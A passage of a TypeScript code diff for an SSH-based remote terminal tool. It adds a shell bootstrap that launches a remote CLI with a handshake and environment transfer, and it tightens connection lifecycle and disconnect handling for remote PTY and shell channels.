+				const data = decoder.write(chunk);
+				if (phase === "running") return emitData(data);
+				markerBuffer += data;
+				if (markerBuffer.length > 128 * 1024) {
+					finish(1, new Error("Invalid remote CLI startup handshake"));
+					close();
+					return;
+				}
+				if (phase === "ready") {
+					const index = markerBuffer.indexOf(ready);
+					if (index < 0) return;
+					markerBuffer = markerBuffer.slice(index + ready.length);
+					phase = "start";
+					const input = payload + delimiter + "\n";
+					payload = "";
+					try {
+						stream!.write(input);
+					} catch {
+						finish(1, new Error("Remote CLI environment transfer failed"));
+						close();
+						return;
+					}
+				}
+				if (phase === "start") {
+					const index = markerBuffer.indexOf(started);
+					if (index < 0) return;
+					phase = "running";
+					clearTimeout(timer);
+					signal?.removeEventListener("abort", onAbort);
+					emitData(markerBuffer.slice(index + started.length));
+					markerBuffer = "";
+					setImmediate(() => {
+						if (ended || resolved) return;
+						resolved = true;
+						resolve(pty);
+					});
+				}
+			};
+			signal?.addEventListener("abort", onAbort, { once: true });
+			if (signal?.aborted) return onAbort();
+			void this.getOrConnectByUri(uri)
+				.then(async ({ conn, parsed }) => {
+					if (ended) return;
+					const cwd = parsed.remotePath || "/";
+					if (!cwd.startsWith("/") || /[\x00-\x1f\x7f]/.test(cwd)) throw new Error("Invalid remote working directory");
+					const bootstrap = [
+						"set +x",
+						'case "$(uname -s)" in Linux|Darwin|FreeBSD|OpenBSD|NetBSD|DragonFly|SunOS|AIX) ;; *) exit 125;; esac',
+						`cd ${shellQuotePosix(cwd)} || exit 125`,
+						`[ -f ${shellQuotePosix(command.file)} ] && [ -x ${shellQuotePosix(command.file)} ] || exit 126`,
+						"PI_WEB_BOOTSTRAP_TTY=$(stty -g) || exit 125",
+						`trap 'stty "$PI_WEB_BOOTSTRAP_TTY" 2>/dev/null' 0`,
+						"stty -echo -echonl -icanon -isig -ixon -icrnl -inlcr -igncr min 1 time 0 || exit 125",
+						`printf '\\n%s\\n' ${shellQuotePosix(ready)}`,
+						"PI_WEB_BOOTSTRAP_PAYLOAD=",
+						"PI_WEB_BOOTSTRAP_DONE=",
+						"while IFS= read -r PI_WEB_BOOTSTRAP_LINE; do",
+						`  if [ "$PI_WEB_BOOTSTRAP_LINE" = ${shellQuotePosix(delimiter)} ]; then PI_WEB_BOOTSTRAP_DONE=1; break; fi`,
+						'  PI_WEB_BOOTSTRAP_PAYLOAD="$PI_WEB_BOOTSTRAP_PAYLOAD$PI_WEB_BOOTSTRAP_LINE',
+						'"',
+						'  [ "${#PI_WEB_BOOTSTRAP_PAYLOAD}" -le 65536 ] || exit 125',
+						"done",
+						'[ "$PI_WEB_BOOTSTRAP_DONE" = 1 ] || exit 125',
+						'stty "$PI_WEB_BOOTSTRAP_TTY" || exit 125',
+						"trap - 0",
+						'eval "$PI_WEB_BOOTSTRAP_PAYLOAD" || exit 125',
+						"unset PI_WEB_BOOTSTRAP_PAYLOAD PI_WEB_BOOTSTRAP_LINE PI_WEB_BOOTSTRAP_DONE PI_WEB_BOOTSTRAP_TTY",
+						`printf '\\n%s\\n' ${shellQuotePosix(started)}`,
+						`exec ${[command.file, ...command.args].map(shellQuotePosix).join(" ")}`,
+					].join("\n");
+					release = this.acquireConnection(conn);
+					const onDisconnect = () => finish(1, new Error("SSH connection lost"));
+					conn.client.once("close", onDisconnect);
+					conn.client.once("end", onDisconnect);
+					conn.client.once("error", onDisconnect);
+					detach = () => {
+						conn.client.removeListener("close", onDisconnect);
+						conn.client.removeListener("end", onDisconnect);
+						conn.client.removeListener("error", onDisconnect);
+					};
+					let prepared: { command: string; skipHandshake?: boolean };
+					try {
+						prepared = options.prepareBootstrap
+							? await options.prepareBootstrap(bootstrap)
+							: { command: `/bin/sh -c ${shellQuotePosix(bootstrap)}` };
+					} catch (error) {
+						finish(1, error instanceof Error ? error : new Error("Remote CLI preparation failed"));
+						return;
+					}
+					if (ended) return;
+					if (prepared.skipHandshake) {
+						payload = "";
+						phase = "running";
+					}
+					conn.client.exec(
+						prepared.command,
+						{
+							pty: { term: "xterm-256color", cols: currentCols, rows: currentRows },
+						},
+						(error, channel) => {
+							if (error) return finish(1, new Error("Remote CLI channel could not be opened"));
+							stream = channel;
+							channel.on("error", () => {
+								finish(1, new Error("Remote CLI channel failed"));
+								close();
+							});
+							if (ended) {
+								close();
+								return;
+							}
+							channel.on("close", (code: number | null) => finish(typeof code === "number" ? code : 1));
+							channel.on("data", onData);
+							channel.stderr.on("data", onData);
+							if (prepared.skipHandshake) {
+								clearTimeout(timer);
+								signal?.removeEventListener("abort", onAbort);
+								resolved = true;
+								resolve(pty);
+							}
+						},
+					);
+				})
+				.catch(() => finish(1, new Error("Remote CLI connection or startup failed")));
+		});
+	}
+
 	createVirtualPty(uri: string, cols: number, rows: number): import("node-pty").IPty {
 		const dataListeners: Array<(data: string) => void> = [];
 		const exitListeners: Array<(e: { exitCode: number; signal?: number }) => void> = [];
@@ -1621,6 +1826,9 @@ fi
 		let currentCols = Math.max(2, Math.floor(cols) || 80);
 		let currentRows = Math.max(2, Math.floor(rows) || 24);
 		let killed = false;
+		let exited = false;
+		let release: (() => void) | undefined;
+		let detach: (() => void) | undefined;
 
 		const emitData = (str: string) => {
 			for (const fn of dataListeners) {
@@ -1630,6 +1838,10 @@ fi
 			}
 		};
 		const emitExit = (exitCode: number) => {
+			if (exited) return;
+			exited = true;
+			release?.();
+			detach?.();
 			for (const fn of exitListeners) {
 				try {
 					fn({ exitCode });
@@ -1641,6 +1853,16 @@ fi
 			try {
 				const { conn, parsed } = await this.getOrConnectByUri(uri);
 				if (killed) return;
+				release = this.acquireConnection(conn);
+				const onDisconnect = () => emitExit(1);
+				conn.client.once?.("close", onDisconnect);
+				conn.client.once?.("end", onDisconnect);
+				conn.client.once?.("error", onDisconnect);
+				detach = () => {
+					conn.client.removeListener?.("close", onDisconnect);
+					conn.client.removeListener?.("end", onDisconnect);
+					conn.client.removeListener?.("error", onDisconnect);
+				};
 				conn.client.shell(
 					{
 						term: "xterm-256color",
@@ -1648,11 +1870,9 @@ fi
 						rows: currentRows,
 					},
 					(err, stream) => {
-						if (err || killed) {
+						if (err || killed || exited) {
 							if (err) emitData(`\r\n[SSH Terminal Error: ${err.message}]\r\n`);
-							if (killed && !err) {
-								// 握手完成前已被 kill：必须关掉已打开的 shell channel，
-								// 否则远端 PTY 里的登录 shell 一直跑到整条连接断开才回收
+							if ((killed || exited) && !err) {
 								try {
 									stream.close();
 								} catch {}
@@ -1661,6 +1881,12 @@ fi
 							return;
 						}
 						channel = stream;
+						stream.on("error", () => {
+							emitExit(1);
+							try {
+								stream.close();
+							} catch {}
+						});
 						stream.on("data", (chunk: Buffer) => {
 							emitData(chunk.toString("utf8"));
 						});
@@ -1671,7 +1897,6 @@ fi
 							channel = null;
 							emitExit(typeof code === "number" ? code : 0);
 						});
-						// 自动进入远程项目工作目录
 						if (parsed.remotePath && parsed.remotePath !== "~") {
 							stream.write(`cd ${shellQuotePosix(parsed.remotePath)} && clear\r`);
 						}
@@ -1732,6 +1957,7 @@ fi
 			kill(_signal?: string) {
 				if (killed) return;
 				killed = true;
+				emitExit(0);
 				if (channel) {
 					try {
 						channel.close();
@@ -1749,9 +1975,6 @@ fi
 		return virtualPty;
 	}
 
-	/**
-	 * 为目标主机打开交互式 PTY Shell 通道（返回底层 ClientChannel 流与连接）
-	 */
 	async openShell(
 		target: { host: string; port?: number; username: string; remotePath?: string },
 		options: { cols?: number; rows?: number; term?: string } = {},
@@ -1762,36 +1985,82 @@ fi
 	}> {
 		const port = target.port ?? 22;
 		const conn = await this.getOrConnectHost(target.host, port, target.username);
+		const release = this.acquireConnection(conn);
 		return new Promise((resolve, reject) => {
-			conn.client.shell(
-				{
-					term: options.term ?? "xterm-256color",
-					cols: Math.max(2, Math.floor(options.cols ?? 80)),
-					rows: Math.max(2, Math.floor(options.rows ?? 24)),
-				},
-				(err, stream) => {
-					if (err) return reject(err);
-					if (target.remotePath && target.remotePath !== "~") {
-						stream.write(`cd ${shellQuotePosix(target.remotePath)} && clear\r`);
-					}
-					resolve({
-						stream,
-						conn,
-						close: () => {
+			let settled = false;
+			const onDisconnect = () => {
+				release();
+				if (!settled) {
+					settled = true;
+					reject(new Error("SSH connection lost"));
+				}
+				detach();
+			};
+			const detach = () => {
+				conn.client.removeListener?.("close", onDisconnect);
+				conn.client.removeListener?.("end", onDisconnect);
+				conn.client.removeListener?.("error", onDisconnect);
+			};
+			conn.client.once?.("close", onDisconnect);
+			conn.client.once?.("end", onDisconnect);
+			conn.client.once?.("error", onDisconnect);
+			try {
+				conn.client.shell(
+					{
+						term: options.term ?? "xterm-256color",
+						cols: Math.max(2, Math.floor(options.cols ?? 80)),
+						rows: Math.max(2, Math.floor(options.rows ?? 24)),
+					},
+					(err, stream) => {
+						if (err) {
+							release();
+							detach();
+							settled = true;
+							return reject(err);
+						}
+						if (settled) {
+							stream.on("error", () => {});
 							try {
 								stream.close();
 							} catch {}
-						},
-					});
-				},
-			);
+							return;
+						}
+						settled = true;
+						const finish = () => {
+							release();
+							detach();
+						};
+						stream.once("close", finish);
+						stream.on("error", () => {
+							finish();
+							try {
+								stream.close();
+							} catch {}
+						});
+						if (target.remotePath && target.remotePath !== "~") {
+							stream.write(`cd ${shellQuotePosix(target.remotePath)} && clear\r`);
+						}
+						resolve({
+							stream,
+							conn,
+							close: () => {
+								finish();
+								try {
+									stream.close();
+								} catch {}
+							},
+						});
+					},
+				);
+			} catch (error) {
+				release();
+				detach();
+				reject(error);
+			}
 		});
 	}
 }
 
-/**
- * 通过 SFTP 流式响应远程工作区文件的 HTTP 下载与媒体/HTML 预览请求（/api/file 与 /api/preview）。
- */
 export async function serveRemoteWorkspaceFile(
 	req: {
 		headers?: Record<string, string | string[] | undefined>;
